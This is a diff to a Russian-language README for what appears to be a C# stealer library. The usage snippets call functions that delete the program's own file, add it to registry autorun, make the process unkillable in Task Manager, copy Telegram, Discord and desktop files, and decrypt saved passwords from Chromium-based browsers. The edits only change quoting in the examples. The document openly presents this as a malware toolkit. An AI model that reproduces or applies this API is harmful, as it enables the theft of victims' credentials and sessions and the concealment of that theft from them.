@@ -58,11 +58,11 @@ HideModule.CheckProcess("example");
 ```
 Самоудаляемся : 
 ```C# 
-HideModule.Suicide(pathToOwnExe);`
+HideModule.Suicide("pathToOwnExe");`
 ```
 Добавляем в автозагрузку( через реестр ) :
 ```C# 
-HideModule.SetAutorun(имя, которое будет отображаться в реестре, pathToFile);
+HideModule.SetAutorun("имя, которое будет отображаться в реестре", "pathToFile");
 ```
 Делаем процесс невозможным убить в Диспетчере задач :
 ```C# 
@@ -74,12 +74,12 @@ ProcessProtect.Protect();
 
 Общий вид такой :
 ```C# 
- Apps.Desktop/Telegram/Discord/.Steal(pathToCopy, true/false(перезапись старых файлов, если уже есть);
+ Apps.Desktop/Telegram/Discord/.Steal(pathToCopy, true/false("перезапись старых файлов, если уже есть");
 ```
 
 Расшифровываем пароли с ChromiumBased браузеров - 
 ```C# 
-`Browsers.DecryptBrowsers(пароль из бд,энтропия);` 
+`Browsers.DecryptBrowsers(byte[] "пароль из бд",byte[]"энтропия");` 
 ```
 Граббер добавлять не стал, так как это уже жирно. Декрипт происходит через WinAPI функцию.
 
